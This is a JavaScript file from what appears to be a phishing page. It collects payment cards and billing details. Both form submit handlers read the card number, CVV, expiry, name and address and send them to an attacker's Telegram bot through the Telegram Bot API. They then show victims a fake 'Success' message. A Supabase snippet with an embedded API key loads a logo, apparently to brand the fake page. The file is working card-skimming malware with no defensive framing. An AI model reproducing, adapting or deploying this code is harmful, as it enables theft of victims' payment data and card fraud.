const expire = document.querySelector('#expire1');

    expire.addEventListener('input', (e) => {
        let value = e.target.value;
        value = value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }

        e.target.value = value;
    });
    
document.querySelector('#form1').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cardNumber = document.querySelector('#cardNumber1').value;


    const cvv = document.querySelector('#cvv1').value;
    const fullname = document.querySelector('#fullname1').value;
    const address = document.querySelector('#address1').value;
    const city = document.querySelector('#city1').value;
    const state = document.querySelector('#state1').value;
    const country = document.querySelector('#country1').value;
    const postal = document.querySelector('#postal1').value;

    const telegramMgs = `===[CREDIT CARD RESULTS]=== %0A
    ===[CARD DETAILS]=== %0A %0A Credit Card: ${cardNumber} 
    %0A Expired date: ${expire}
    %0A CVV: ${cvv} 
    %0A %0A ===[BILLING DETAILS]=== %0A %0A
    %0A Full Name: ${fullname}
    %0A Address: ${address}
    %0A City: ${city}
    %0A State: ${state}
    %0A Country: ${country}
    %0A Postal: ${postal}`

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${telegramMgs}`

    let api = new XMLHttpRequest()
    api.open("GET",url, true)
    api.send()

    document.querySelector('.loading').style.display="block";
    setTimeout(() => {
        //window.location.href="password.html";
        document.querySelector('.loading').style.display="none";  
    },2000); 
});

const expireInput2 = document.querySelector('#expire2');

    expireInput2.addEventListener('input', (e) => {
        let value = e.target.value;
        value = value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }

        e.target.value = value;
    });

document.querySelector('#form2').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cardNumber = document.querySelector('#cardNumber2').value;
    

    const cvv = document.querySelector('#cvv2').value;
    const fullname = document.querySelector('#fullname2').value;
    const address = document.querySelector('#address2').value;
    const city = document.querySelector('#city2').value;
    const state = document.querySelector('#state2').value;
    const country = document.querySelector('#country2').value;
    const postal = document.querySelector('#postal2').value;

    const telegramMgs = `===[CREDIT CARD RESULTS]=== %0A
    ===[CARD DETAILS]=== %0A %0A Credit Card: ${cardNumber} 
    %0A Expired date: ${expireInput2}
    %0A CVV: ${cvv} 
    %0A %0A ===[BILLING DETAILS]=== %0A %0A
    %0A Full Name: ${fullname}
    %0A Address: ${address}
    %0A City: ${city}
    %0A State: ${state}
    %0A Country: ${country}
    %0A Postal: ${postal}`

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${telegramMgs}`

    let api = new XMLHttpRequest()
    api.open("GET",url, true)
    api.send()

    document.querySelector('.loading').style.display="block";
    setTimeout(() => {
        //window.location.href="password.html";
        Swal.fire("Success", "Thank you we received your information successfully. We get back to you soon on your email for the next information", "success");
        document.querySelector('.loading').style.display="none";  
    },2000); 
});

import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

// Supabase config
const supabaseUrl = "https://eyrjnunkjivuzgquaseo.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cmpudW5raml2dXpncXVhc2VvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYxNDE0NzcsImV4cCI6MjA3MTcxNzQ3N30.nuRyARA-wDx0FoiLTBmxX3MC5XJoqgti6yTFAt5JKtQ";
const supabase = createClient(supabaseUrl, supabaseKey);


// Load logo from Supabase and apply to all logo elements
export async function loadLogo() {
    try {
        const { data, error } = await supabase
            .from('logo')
            .select('*')
            .limit(1); // latest row

        if (error) throw error;

        if (data && data.length > 0) {
            const logoEls = document.querySelectorAll('#logo'); // select all elements with class "logo"
            logoEls.forEach(el => {
                el.src = data[0].logo;
            });
        }
    } catch (err) {
        console.error("❌ Supabase Error:", err);
    }
}

// Call on page load after DOM is ready
document.addEventListener('DOMContentLoaded', loadLogo);
